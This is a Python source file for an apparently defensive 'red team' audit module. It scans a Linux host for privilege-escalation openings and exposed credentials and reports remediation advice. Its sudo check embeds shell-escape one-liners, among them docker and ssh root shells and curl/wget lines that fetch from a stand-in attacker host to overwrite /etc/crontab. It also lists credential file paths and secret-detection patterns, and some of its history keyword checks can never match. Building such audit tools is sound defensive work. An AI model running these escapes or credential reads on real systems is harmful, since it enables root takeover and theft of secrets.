"""
xping.modules.redteam
~~~~~~~~~~~~~~~~~~~~~~~~~
Red Team Validation Module

Simulates an attacker's perspective to identify privilege escalation
vectors and post-compromise opportunities:
  - Writable PATH directories
  - Sudo misconfigurations for privesc
  - Container escape indicators
  - Credential exposure (cleartext passwords in files)
  - Writable systemd service files
  - Shared library hijacking paths
  - Kernel exploit eligibility
  - Cronjob hijacking
"""

import os
import re
from typing import List

from xping.modules.base import BaseModule
from xping.core.models import ModuleResult, Finding, Severity
from xping.core.logger import get_logger
from xping.utils.helpers import (
    run_cmd, run_cmd_lines, read_file_safe, read_file_lines, is_root,
)

log = get_logger("redteam")

# Files commonly containing credentials
CREDENTIAL_FILES = [
    "/etc/mysql/my.cnf",
    "/etc/mysql/debian.cnf",
    "/etc/postgresql/*/main/pg_hba.conf",
    "/etc/shadow.bak",
    "/etc/passwd-",
    "/var/www/.env",
    "/opt/*/.env",
    "/home/*/.bash_history",
    "/root/.bash_history",
    "/home/*/.mysql_history",
    "/root/.mysql_history",
    "/home/*/.ssh/id_rsa",
    "/root/.ssh/id_rsa",
    "/var/log/cloud-init.log",
    "/var/lib/jenkins/config.xml",
    "/etc/openvpn/*.conf",
    "/etc/wireguard/*.conf",
]

# Regex patterns for credential detection
RE_PASSWORD = re.compile(
    r"(password|passwd|pwd|pass)\s*[=:]\s*\S+",
    re.IGNORECASE
)
RE_PRIVATE_KEY = re.compile(r"-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----")
RE_AWS_KEY = re.compile(r"(?:AKIA|ASIA)[0-9A-Z]{16}")
RE_API_TOKEN = re.compile(r"(api[_-]?key|api[_-]?token|bearer)\s*[=:]\s*\S{10,}", re.IGNORECASE)

# Known vulnerable kernel version patterns (simplified heuristics)
# Maps kernel version prefix to CVE and description
KERNEL_EXPLOITS = [
    ("3.13.", "CVE-2015-1328", "OverlayFS local privilege escalation"),
    ("4.4.", "CVE-2016-5195", "Dirty COW — write access to read-only memory"),
    ("4.14.", "CVE-2017-16995", "eBPF sign extension local privilege escalation"),
    ("4.15.", "CVE-2019-13272", "ptrace_link local privilege escalation"),
    ("5.4.", "CVE-2021-3493", "OverlayFS Ubuntu local privilege escalation"),
    ("5.8.", "CVE-2021-22555", "Netfilter heap out-of-bounds write"),
    ("5.10.", "CVE-2022-0847", "Dirty Pipe — arbitrary file overwrite"),
    ("5.13.", "CVE-2022-0847", "Dirty Pipe — arbitrary file overwrite"),
    ("5.14.", "CVE-2022-0847", "Dirty Pipe — arbitrary file overwrite"),
    ("5.15.", "CVE-2022-0847", "Dirty Pipe — arbitrary file overwrite"),
    ("5.16.", "CVE-2022-0847", "Dirty Pipe — arbitrary file overwrite"),
    ("5.8.", "CVE-2022-2588", "route4 use-after-free local privilege escalation"),
    ("6.1.", "CVE-2023-2640", "OverlayFS privilege escalation (Ubuntu/GameOver(lay))"),
    ("6.2.", "CVE-2023-2640", "OverlayFS privilege escalation (Ubuntu/GameOver(lay))"),
]


class RedTeamModule(BaseModule):

    @property
    def name(self) -> str:
        return "redteam"

    @property
    def description(self) -> str:
        return "Red team validation: privesc, creds, containers, kernel exploits"

    def run(self) -> ModuleResult:
        findings: List[Finding] = []
        errors: List[str] = []

        findings.extend(self._check_writable_path(errors))
        findings.extend(self._check_sudo_privesc(errors))
        findings.extend(self._check_container_escape(errors))
        findings.extend(self._check_credential_exposure(errors))
        findings.extend(self._check_writable_services(errors))
        findings.extend(self._check_library_hijacking(errors))
        findings.extend(self._check_kernel_exploits(errors))
        findings.extend(self._check_cronjob_hijacking(errors))

        return ModuleResult(
            module_name=self.name,
            description=self.description,
            findings=findings,
            errors=errors,
        )

    def _check_writable_path(self, errors: List[str]) -> List[Finding]:
        """
        Check for writable directories in PATH.

        Why this matters:
            If an attacker can write to a PATH directory, they can place
            a trojan binary that gets executed instead of the real command
            (PATH injection / binary planting).
        """
        findings = []
        path_dirs = os.environ.get("PATH", "").split(":")
        writable = []

        for d in path_dirs:
            d = d.strip()
            if d and os.path.isdir(d) and os.access(d, os.W_OK):
                # Ignore if we're root (root can write everywhere)
                if not is_root():
                    writable.append(d)

        if writable:
            findings.append(self._make_finding(
                title=f"Writable PATH Directories: {len(writable)}",
                description="Current user can write to directories in PATH, enabling binary planting attacks.",
                severity=Severity.HIGH,
                evidence="Writable PATH dirs:\n" + "\n".join(f"  {d}" for d in writable),
                remediation="Remove write permissions from PATH directories for non-root users.",
            ))

        # Check for empty PATH entries (current directory injection)
        if "" in path_dirs or "." in path_dirs:
            findings.append(self._make_finding(
                title="PATH Contains Current Directory",
                description="PATH includes '.' or empty entry, causing programs to be searched in the current directory first.",
                severity=Severity.HIGH,
                evidence=f"PATH={os.environ.get('PATH', '')}",
                remediation="Remove '.' and empty entries from PATH.",
            ))

        return findings

    def _check_sudo_privesc(self, errors: List[str]) -> List[Finding]:
        """Check sudo permissions for privilege escalation vectors."""
        findings = []

        # Check what commands the current user can sudo
        sudo_l, _, rc = run_cmd("sudo -l -n 2>/dev/null")
        if not sudo_l or rc != 0:
            return findings

        # Known privesc commands via sudo
        privesc_cmds = {
            "vim": "Spawn shell: sudo vim -c '!sh'",
            "vi": "Spawn shell: sudo vi -c '!sh'",
            "nano": "Spawn shell via Ctrl+R, Ctrl+X",
            "less": "Spawn shell: sudo less /etc/profile → !sh",
            "more": "Spawn shell: sudo more /etc/profile → !sh",
            "man": "Spawn shell: sudo man man → !sh",
            "find": "Exec shell: sudo find / -exec /bin/sh \\;",
            "nmap": "Interactive mode: sudo nmap --interactive → !sh",
            "python": "Spawn shell: sudo python -c 'import os; os.system(\"/bin/sh\")'",
            "python3": "Spawn shell: sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
            "perl": "Spawn shell: sudo perl -e 'exec \"/bin/sh\"'",
            "ruby": "Spawn shell: sudo ruby -e 'exec \"/bin/sh\"'",
            "lua": "Spawn shell: sudo lua -e 'os.execute(\"/bin/sh\")'",
            "env": "Spawn shell: sudo env /bin/sh",
            "awk": "Spawn shell: sudo awk 'BEGIN {system(\"/bin/sh\")}'",
            "tar": "Checkpoint exec: sudo tar --checkpoint=1 --checkpoint-action=exec=/bin/sh",
            "zip": "Spawn shell: sudo zip /tmp/x.zip /etc/hosts -T --unzip-command=\"sh -c /bin/sh\"",
            "docker": "Root shell: sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
            "strace": "Attach to root process",
            "gdb": "Debug root process and inject shellcode",
            "tcpdump": "Write arbitrary files via -w",
            "wget": "Overwrite files: sudo wget http://attacker/malicious -O /etc/crontab",
            "curl": "Overwrite files: sudo curl http://attacker/malicious -o /etc/crontab",
            "scp": "Copy files as root",
            "rsync": "Sync files as root",
            "git": "Spawn shell via hooks or PAGER",
            "ssh": "ProxyCommand exec: sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
            "tee": "Write to protected files: echo 'data' | sudo tee /etc/shadow",
            "cp": "Overwrite system files",
            "mv": "Replace system binaries",
            "chmod": "Change file permissions",
            "chown": "Change file ownership",
        }

        for cmd, technique in privesc_cmds.items():
            # Check if the command appears in sudo -l output
            if re.search(rf"\b{re.escape(cmd)}\b", sudo_l):
                findings.append(self._make_finding(
                    title=f"Sudo Privesc Vector: {cmd}",
                    description=f"sudo allows '{cmd}' which can be used for privilege escalation.",
                    severity=Severity.CRITICAL,
                    evidence=f"Technique: {technique}\n\nsudo -l output (excerpt):\n{sudo_l[:500]}",
                    remediation=f"Remove '{cmd}' from sudo permissions or use sudoedit for file editing.",
                ))

        return findings

    def _check_container_escape(self, errors: List[str]) -> List[Finding]:
        """Detect container escape vectors."""
        findings = []

        # Docker socket accessible
        if os.path.exists("/var/run/docker.sock"):
            if os.access("/var/run/docker.sock", os.W_OK):
                findings.append(self._make_finding(
                    title="Docker Socket Writable",
                    description="The Docker socket is writable by the current user. Full host compromise is trivial.",
                    severity=Severity.CRITICAL,
                    evidence="/var/run/docker.sock is writable",
                    remediation=(
                        "Remove current user from docker group.\n"
                        "Use rootless Docker or restrict socket permissions."
                    ),
                ))

        # Check if we're inside a container
        cgroup = read_file_safe("/proc/1/cgroup")
        in_container = False
        if cgroup:
            if "docker" in cgroup or "lxc" in cgroup or "containerd" in cgroup:
                in_container = True

        # Also check /.dockerenv
        if os.path.exists("/.dockerenv"):
            in_container = True

        if in_container:
            findings.append(self._make_finding(
                title="Running Inside Container",
                description="This system is running inside a container (Docker/LXC).",
                severity=Severity.INFO,
                evidence="Container indicators found in /proc/1/cgroup or /.dockerenv",
            ))

            # Check for privileged mode
            dev_output, _, _ = run_cmd("ls /dev/sda* 2>/dev/null")
            if dev_output:
                findings.append(self._make_finding(
                    title="Container Running in Privileged Mode",
                    description="Host block devices are accessible — container appears to run in privileged mode.",
                    severity=Severity.CRITICAL,
                    evidence=f"Accessible devices: {dev_output}",
                    remediation="Remove --privileged flag. Use specific capabilities instead.",
                ))

            # Check for host namespace access
            if os.path.exists("/proc/1/ns/pid"):
                pid_ns, _, _ = run_cmd("readlink /proc/1/ns/pid 2>/dev/null")
                self_ns, _, _ = run_cmd("readlink /proc/self/ns/pid 2>/dev/null")
                if pid_ns and self_ns and pid_ns == self_ns:
                    findings.append(self._make_finding(
                        title="Container Shares Host PID Namespace",
                        description="Container shares the host PID namespace — can see and interact with host processes.",
                        severity=Severity.HIGH,
                        evidence=f"PID namespace: {pid_ns}",
                        remediation="Remove --pid=host flag from container runtime.",
                    ))

        return findings

    def _check_credential_exposure(self, errors: List[str]) -> List[Finding]:
        """Search for cleartext credentials in common locations."""
        findings = []

        # Expand glob patterns and check files
        import glob
        checked_files = set()

        for pattern in CREDENTIAL_FILES:
            matches = glob.glob(pattern)
            for filepath in matches:
                if filepath in checked_files or not os.path.isfile(filepath):
                    continue
                checked_files.add(filepath)

                if not os.access(filepath, os.R_OK):
                    continue

                content = read_file_safe(filepath, max_lines=500)
                if not content:
                    continue

                # Check for private keys
                if RE_PRIVATE_KEY.search(content):
                    findings.append(self._make_finding(
                        title=f"Private Key Found: {filepath}",
                        description=f"An unencrypted private key was found in {filepath}.",
                        severity=Severity.CRITICAL,
                        evidence=f"File: {filepath}\nContains: -----BEGIN PRIVATE KEY-----",
                        remediation="Encrypt or remove the key. Use ssh-agent for key management.",
                    ))

                # Check for AWS keys
                aws_match = RE_AWS_KEY.search(content)
                if aws_match:
                    findings.append(self._make_finding(
                        title=f"AWS Access Key Found: {filepath}",
                        description=f"An AWS access key ID was found in {filepath}.",
                        severity=Severity.CRITICAL,
                        evidence=f"File: {filepath}\nKey prefix: {aws_match.group()[:8]}...",
                        remediation="Rotate the AWS key immediately. Use IAM roles instead.",
                    ))

                # Check for plaintext passwords
                for line in content.splitlines():
                    if RE_PASSWORD.search(line):
                        # Mask the value
                        masked_line = re.sub(
                            r"(password|passwd|pwd|pass)\s*[=:]\s*(\S+)",
                            r"\1=***MASKED***",
                            line,
                            flags=re.IGNORECASE
                        )
                        findings.append(self._make_finding(
                            title=f"Plaintext Password: {filepath}",
                            description=f"A plaintext password was found in {filepath}.",
                            severity=Severity.HIGH,
                            evidence=f"File: {filepath}\nLine: {masked_line.strip()}",
                            remediation="Use a secrets manager. Remove passwords from config files.",
                        ))
                        break  # One finding per file for passwords

        # Check bash history for sensitive commands
        history_files = glob.glob("/home/*/.bash_history") + ["/root/.bash_history"]
        for hist_file in history_files:
            if not os.access(hist_file, os.R_OK):
                continue
            content = read_file_safe(hist_file, max_lines=1000)
            if not content:
                continue

            sensitive_cmds = []
            for line in content.splitlines():
                line_lower = line.lower().strip()
                if any(kw in line_lower for kw in ["mysql -u", "psql -U", "sshpass", "curl.*password",
                                                     "wget.*password", "echo.*password"]):
                    sensitive_cmds.append(line.strip())

            if sensitive_cmds:
                findings.append(self._make_finding(
                    title=f"Credentials in History: {hist_file}",
                    description=f"Commands with potential credentials found in shell history.",
                    severity=Severity.MEDIUM,
                    evidence="\n".join(sensitive_cmds[:5]),
                    remediation=f"Clear history: > {hist_file}. Use .my.cnf or env vars for DB creds.",
                ))

        return findings

    def _check_writable_services(self, errors: List[str]) -> List[Finding]:
        """Check for writable systemd service files."""
        findings = []

        if is_root():
            return findings  # Only meaningful for unprivileged users

        service_dirs = [
            "/etc/systemd/system",
            "/usr/lib/systemd/system",
            "/lib/systemd/system",
            "/run/systemd/system",
        ]

        for svc_dir in service_dirs:
            if not os.path.isdir(svc_dir):
                continue
            try:
                for fname in os.listdir(svc_dir):
                    fpath = os.path.join(svc_dir, fname)
                    if os.path.isfile(fpath) and os.access(fpath, os.W_OK):
                        findings.append(self._make_finding(
                            title=f"Writable Service File: {fname}",
                            description=f"Systemd unit file is writable by current user. Can be modified to execute arbitrary commands as root on service restart.",
                            severity=Severity.CRITICAL,
                            evidence=f"Writable: {fpath}",
                            remediation=f"Fix permissions: chmod 644 {fpath} && chown root:root {fpath}",
                        ))
            except PermissionError:
                pass

        return findings

    def _check_library_hijacking(self, errors: List[str]) -> List[Finding]:
        """Check for shared library hijacking opportunities."""
        findings = []

        # LD_PRELOAD set
        ld_preload = os.environ.get("LD_PRELOAD", "")
        if ld_preload:
            findings.append(self._make_finding(
                title="LD_PRELOAD Set",
                description="LD_PRELOAD environment variable is set, which overrides shared library loading.",
                severity=Severity.HIGH,
                evidence=f"LD_PRELOAD={ld_preload}",
                remediation="Unset LD_PRELOAD unless specifically required.",
            ))

        # LD_LIBRARY_PATH writable directories
        ld_lib_path = os.environ.get("LD_LIBRARY_PATH", "")
        if ld_lib_path:
            for d in ld_lib_path.split(":"):
                d = d.strip()
                if d and os.path.isdir(d) and os.access(d, os.W_OK) and not is_root():
                    findings.append(self._make_finding(
                        title=f"Writable LD_LIBRARY_PATH: {d}",
                        description="A directory in LD_LIBRARY_PATH is writable, enabling shared library injection.",
                        severity=Severity.HIGH,
                        evidence=f"LD_LIBRARY_PATH contains writable dir: {d}",
                        remediation="Remove writable directories from LD_LIBRARY_PATH.",
                    ))

        # Check /etc/ld.so.conf for unusual entries
        ld_conf = read_file_safe("/etc/ld.so.conf")
        if ld_conf:
            for line in ld_conf.splitlines():
                line = line.strip()
                if line and not line.startswith("#") and not line.startswith("include"):
                    if os.path.isdir(line) and os.access(line, os.W_OK) and not is_root():
                        findings.append(self._make_finding(
                            title=f"Writable Library Path: {line}",
                            description=f"Shared library search path {line} is writable by current user.",
                            severity=Severity.HIGH,
                            evidence=f"ld.so.conf entry: {line} (writable)",
                            remediation=f"Fix permissions: chmod 755 {line}",
                        ))

        return findings

    def _check_kernel_exploits(self, errors: List[str]) -> List[Finding]:
        """
        Match running kernel against known exploit patterns.

        Caveat: This is a simplified heuristic. Actual exploitability depends
        on distro-specific patches, kernel config, and runtime environment.
        """
        findings = []

        kernel_out, _, rc = run_cmd("uname -r")
        if not kernel_out:
            return findings

        kernel_version = kernel_out.strip()
        matched_cves = []

        for prefix, cve, description in KERNEL_EXPLOITS:
            if kernel_version.startswith(prefix):
                matched_cves.append((cve, description))

        if matched_cves:
            # Deduplicate CVEs
            unique_cves = list(set(matched_cves))
            findings.append(self._make_finding(
                title=f"Kernel May Be Vulnerable: {len(unique_cves)} potential CVEs",
                description=(
                    f"Kernel {kernel_version} matches version patterns associated with "
                    f"known privilege escalation exploits. Note: distro-specific patches may "
                    f"have already fixed these."
                ),
                severity=Severity.HIGH,
                evidence="\n".join(f"  {cve}: {desc}" for cve, desc in unique_cves),
                remediation="Update the kernel to the latest version. Verify with your distro's security tracker.",
            ))

        return findings

    def _check_cronjob_hijacking(self, errors: List[str]) -> List[Finding]:
        """Check for cronjob hijacking opportunities."""
        findings = []

        if is_root():
            return findings

        # Check if /etc/cron.d is writable
        cron_dirs = ["/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly"]
        for cron_dir in cron_dirs:
            if os.path.isdir(cron_dir) and os.access(cron_dir, os.W_OK):
                findings.append(self._make_finding(
                    title=f"Writable Cron Directory: {cron_dir}",
                    description=f"Cron directory is writable by current user. Can place arbitrary cron jobs.",
                    severity=Severity.CRITICAL,
                    evidence=f"Writable: {cron_dir}",
                    remediation=f"Fix permissions: chmod 755 {cron_dir} && chown root:root {cron_dir}",
                ))

        # Check PATH in crontab — can we hijack commands?
        crontab_content = read_file_safe("/etc/crontab")
        if crontab_content:
            for line in crontab_content.splitlines():
                if line.strip().startswith("PATH="):
                    cron_path = line.split("=", 1)[1].strip()
                    for d in cron_path.split(":"):
                        d = d.strip()
                        if d and os.path.isdir(d) and os.access(d, os.W_OK) and not is_root():
                            findings.append(self._make_finding(
                                title=f"Cron PATH Hijacking: {d}",
                                description=f"Crontab PATH includes writable directory {d}. Can plant trojan binaries.",
                                severity=Severity.CRITICAL,
                                evidence=f"Crontab PATH: {cron_path}\nWritable dir: {d}",
                                remediation=f"Remove write permissions: chmod 755 {d}",
                            ))

        return findings
